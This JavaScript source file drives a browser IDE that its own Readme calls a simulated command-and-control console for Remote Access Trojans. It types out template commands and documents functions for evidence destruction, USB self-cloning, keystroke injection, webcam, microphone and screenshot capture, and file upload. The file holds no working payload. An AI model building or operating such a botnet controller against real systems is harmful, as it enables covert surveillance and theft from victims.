const typer = (x) => {
 toast.publish({
  type: "robot",
  hideClose: true,
  description: `Initializing Autopilot...`,
  timeout: 1000,
 });
 hotrelod = false;
 document.getElementById("backdrop").style.display = "block";
 document.getElementById("ebar").setAttribute("class", "toolbar inbar nohover");
 document.getElementById("assets").setAttribute("class", "nobtn");
 const t0 = performance.now();
 if (document.getElementById("fne").textContent == "Readme.md" || document.getElementById("fne").textContent == "License.txt") {
  document.getElementById("readonly").style.display = "none";
  document.getElementById("editor").style.display = "block";
  document.getElementById("ide").setAttribute("class", "pretty-split-pane-component-inner logo");
  shakeSpeare(x, t0);
 } else {
  if (editor.getValue().length != 0) {
   let eraser = setInterval(function () {
    // console.log("clearing code...");
    editor.getSession().setValue(editor.getValue().slice(0, -1));
    if (editor.getValue().length == 0) {
     clearInterval(eraser);
     shakeSpeare(x, t0);
    }
   }, 0);
  } else {
   shakeSpeare(x, t0);
  }
 }
};

const shakeSpeare = (x, y) => {
 document.getElementById("fne").textContent = "Program-" + x + ".fdm";
 let tale;
 switch (x) {
  case 1:
   tale = `// |================================================|\n// | Program-1\n// | Description: Delete RATs from All Systems.\n// | Warning: This Action is Irreversible!\n// |________________________________________________|\n\nPC.All(); // Selects All Systems.\nPC.Escape(); // Initiate Escape Sequence.\n\n`;
   break;
  case 2:
   tale = `// |================================================|\n// | Program-2\n// | Description: Deletes a Specific RAT\n// | Warning: This Action is Irreversible!\n// |________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'.\nPC.Escape(); // Initiate Escape Sequence. \n\n`;
   break;
  case 3:
   tale = `// |================================================|\n// | Program-3\n// | Description: Checks if a RAT is Online\n// | Response: POLO!\n// |________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'.\nPC.Marco(); // Returns Polo if Online\n\n`;
   break;
  case 4:
   tale = `// |===================================================|\n// | Program-4\n// | Description: Temporarily end Botnet execution.\n// | Warning: This makes All systems go Offline.\n// |___________________________________________________|\n\nPC.All(); // Selects All Systems.\nPC.Exit(); // End the process.\n\n`;
   break;
  case 5:
   tale = `// |======================================================|\n// | Program-5\n// | Description: Temporarily end a specific RAT Process\n// | Warning: This makes the RAT go Offline.\n// |______________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'.\nPC.Exit(); // End the process\n\n`;
   break;
  case 6:
   tale = `// |==============================================|\n// | Program-6\n// | Description: Update All RAT's firmware.\n// | Warning: This Action is Irreversible!\n// |______________________________________________|\n\nPC.All(); // Selects All systems.\nPC.Update("https://www..."); // URL to the firmware file\n \n`;
   break;
  case 7:
   tale = `// |================================================|\n// | Program-7\n// | Description: Update a Specific RAT's firmware.\n// | Warning: This Action is Irreversible!\n// |________________________________________________|\n\nvar bot="A01";\nPC.Lock(bot); // Selects 'A01'.\nPC.Update("https://www..."); // URL to the firmware file\n\n`;
   break;
  case 8:
   tale = `// |======================================================|\n// |  Program-8\n// |  Description: Enter hibernation mode for All Systems.\n// |  Note: However each RAT Will issue a single-\n// |  heartbeat signal on first startup of the day.\n// |______________________________________________________|\n\nPC.All(); // Selects All Systems.\nPC.Hibernate("15-01-2030"); // In DD-MM-YY Format.\n\n`;
   break;
  case 9:
   tale = `// |======================================================|\n// |  Program-9\n// |  Description: Enter hibernation for a specific RAT.\n// |  Note: However the RAT Will issue a single-\n// |  heartbeat signal on first startup of the day.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Hibernate("15-01-2030"); // In DD-MM-YY Format.\n\n`;
   break;
  case 10:
   tale = `// |======================================================|\n// |  Program-10\n// |  Description: Start Cloning to any connected USB.\n// |  Warning: May arise suspicion.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.Clone("Name","https://www..."); // Format: Alias Name, Icon URL\n\n`;
   break;
  case 11:
   tale = `// |======================================================|\n// |  Program-11\n// |  Description: Terminates Cloning Operations.\n// |______________________________________________________|\n\nvar bot='A01';\nPC.Lock(bot); // Selects 'A01'.\nPC.NClone(); // Halt Cloning\n\n`;
   break;
  case 12:
   tale = "// |==============================================|\n// |  Program-12\n// |  Description: Play an mp3 audio on a specific system.\n// |  Requirements: Secret Key\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 13:
   tale = "// |==============================================|\n// |  Program-13\n// |  Description: Show Timed message box on a specific host.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 14:
   tale = "// |==============================================|\n// |  Program-14\n// |  Description: Display Message box on a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 15:
   tale = "// |==============================================|\n// |  Program-15\n// |  Description: Non-Maskable Chat with a specific RAT.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 16:
   tale = "// |==============================================|\n// |  Program-16\n// |  Description: Maskable Chat with a specific RAT.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 17:
   tale = "// |==============================================|\n// |  Program-17\n// |  Description: Auto google a query on a specific RAT.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 18:
   tale = "// |==============================================|\n// |  Program-18\n// |  Description: Inject keystrokes on a specific RAT.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 19:
   tale = "// |==============================================|\n// |  Program-19\n// |  Description: Rename a specific RAT.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 20:
   tale = "// |==============================================|\n// |  Program-20\n// |  Description: Find Device Location using IP Address.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 21:
   tale = "// |==============================================|\n// |  Program-21\n// |  Description: Enter hibernation mode on All RATs.\n// |  Requirements: Secret Key\n// |________________________________________________|\n\nTAR,PAUSE,ENDT  // Target Section\nARG,14,ENDA  // Hibernate for 14 Days\n// The key will Auto-hide As you type..\nKEY:123456789\n// To view Hidden key : Hit CTRL + A or Toggle X-Ray by Selecting key text with cursor\n";
   break;
  case 22:
   tale = "// |==============================================|\n// |  Program-22\n// |  Description: Enter hibernation mode on a specific RAT.\n// |  Requirements: Secret Key\n// |________________________________________________|\n\nTAR,A01,ENDT  // Selects RAT Named 'A01'\nCMD,PAUSE,ENDC // Perform Hibernation sequence\nARG,14,ENDA  // Hibernate for 14 Days\n// The key will Auto-hide As you type..\nKEY:123456789\n// To view Hidden key : Hit CTRL + A or Toggle X-Ray by Selecting key text with cursor\n";
   break;
  case 23:
   tale = "// |==============================================|\n// |  Program-23\n// |  Description: Routine Health checkup for a specific RAT.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 24:
   tale = "// |==============================================|\n// |  Program-24\n// |  Description: Return Disk summary for a specific system\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 25:
   tale = "// |==============================================|\n// |  Program-25\n// |  Description: Traverse through directories of a host.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 26:
   tale = "// |==============================================|\n// |  Program-26\n// |  Description: Uplink a file from a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 27:
   tale = "// |==============================================|\n// |  Program-27\n// |  Description: Download a file onto a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 28:
   tale = "// |==============================================|\n// |  Program-28\n// |  Description: Record Audio activity on a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 29:
   tale = "// |==============================================|\n// |  Program-29\n// |  Description: Return process history for a specifc system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 30:
   tale = "// |==============================================|\n// |  Program-30\n// |  Description: Return Webcam image from a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 31:
   tale = "// |==============================================|\n// |  Program-31\n// |  Description: Return a Screenshot from a specific system.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  case 32:
   tale = "// |==============================================|\n// |  Program-32\n// |  Description: Run VB Script & escape from a specific host.\n// |________________________________________________|\n\nTAR,EXIT,ENDT  // Target Section\n";
   break;
  default:
   break;
 }
 let s = 0;
 let ink = setInterval(function () {
  editor.getSession().setValue(tale.substring(0, s));
  s++;
  if (s === tale.length) {
   clearInterval(ink);
   document.getElementById("ebar").setAttribute("class", "toolbar inbar");
   document.getElementById("assets").setAttribute("class", "");
   document.getElementById("backdrop").style.display = "none";
   hotrelod = true;
   editor.getSession().setValue(editor.getValue() + " ");
   //    editor.navigateLineEnd();
   const t1 = performance.now();
   let ms = t1 - y;
   ms /= 1000;
   let latency = Math.round((ms + Number.EPSILON) * 100) / 100;
   toast.publish({
    type: "robot",
    hideClose: true,
    description: `Finished writing in  ${latency} sec`,
    timeout: 2000,
   });
  }
 }, 1);
};

const lawyer = (l) => {
 if (hotrelod) {
  document.getElementById("editor").style.display = "none";
  document.getElementById("readonly").style.display = "block";
  document.getElementById("run").setAttribute("class", "menubar-item nohover");
  document.getElementById("ide").setAttribute("class", "pretty-split-pane-component-inner logo read");

  if (l == 0) {
   document.getElementById("fne").textContent = "Readme.md";
   document.getElementById("readonly").innerHTML = `
===================================
       DOCUMENTATION
===================================

Version : 4.0.1
Last Updated : 19 Februvary 2021


    INTRODUCTION
-----------------------------------

        This is a browser based implementation of an integrated Environment and an embedded JS Runtime (ace-editor) designed to control Remote Access Trojans (RATs) in a distributed Botnet / RAT Network. The interface is designed to simulate a basic command and control facility for the communication of RATs in the Network. All RATs on the network are pre-programmed to follow the syntax and definitions of this custom language. A few examples are provided in the Wiki section. Permission for use is granted only for Educational purposes, and are strictly subjected to the conditions specified in the license agreement.


 LIST OF BUILT-IN FUNCTIONS
----------------------------------------------------

1) Excape(x) - Execute Batch script and Escape()
2) Escape() - Destroy Evidence and Escape
3) Marco() - Returns Polo if Online
4) Exit() - End Execution
5) Update(x) - Updates self
6) Hibernate(x) -  till date
7) Revive() - End Hibernation  
8) Notify() - Notifies power schedule
9) Rename(x) - Renames RAT
10) Flash() - Flashes Screen, Visual Indication
11) Vbs(x) - Runs .VBS Script
12) Bat(x) - Runs .Bat Script
13) Shell(x) - Runs Shell Commands
14) Speak(x) - Text to Speech
15) Play(x) - Play a Remote (mp3) Audio File (URL)
16) Mic(x) - Records audio for 'x' ms
17) Lock(x) - Select Target
18) Info(x) - Shows Info box
19) Warn(x) - Shows Warning Box
20) Error(x) - Shows Error box
21) Msgbox(x,y) - Shows Msg Box fo 'y' ms
22) Google(x) - Googles selected Text
23) Web(x) - Navigates to 'x' url
24) Type(x) - Types custom text
25) Screenshot(x) - Takes a Screenshot
26) Camera(x) - Captures a Photo
27) Details(x) - Retrieves Disk Info
28) Tree(x) - Retrieves Disk Info
29) Send(x) - Sends a File
30) Zip(x) - Zip a folder
31) Unzip(x) - Unzips file
32) Health(x) - Reports back working conditions
33) Log(x) - Logs every Activity
34) Delay(x) - Pause Execution temporarily for 'x' ms
35) Shutdown(x) - Shutsdown the system after 'x' ms"
36) Clone() - Initiate Clone Operations
37) NClone() - Stops Cloning Operations

Eg: PC.Lock("A01");

`;
  } else {
   document.getElementById("fne").textContent = "License.txt";
   document.getElementById("readonly").innerHTML = `
===================================
       LICENSE / TERMS OF USE
===================================

Author: Ashik saleem

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), for use in a manner of educational purposes only, and are strictly subjected to the following conditions:-

1. USAGE FOR HACKING OR ANY ILLEGAL MEANS IS STRICTLY PROHIBITED. IN SUCH AN EVENT THE ORIGINAL OWNER IS NOT, IN ANY MANNER OF FORM RESPONSIBLE FOR THE DAMAGES CAUSED..
2. USAGE OF THIS SOFTWARE AS A COMMAND AND CONTROL FACILITY IS STRICTLY FORBIDDEN.
3. ANY ILLEGAL ACTIVITY INVOLVING THIS SOFTWARE MAY AUTOMATICALLY REVOKE THIS AGREEMENT.
4. THIS COPYRIGHT / PERMISSION NOTICE SHALL BE INCLUDED IN ALL COPIES AND IS APPLICABLE TO ALL PORTIONS OF THE SOFTWARE..
5. RESPECT PRIVACY, DONT BE A D*CK.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, AND IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
`;
  }
 }
};
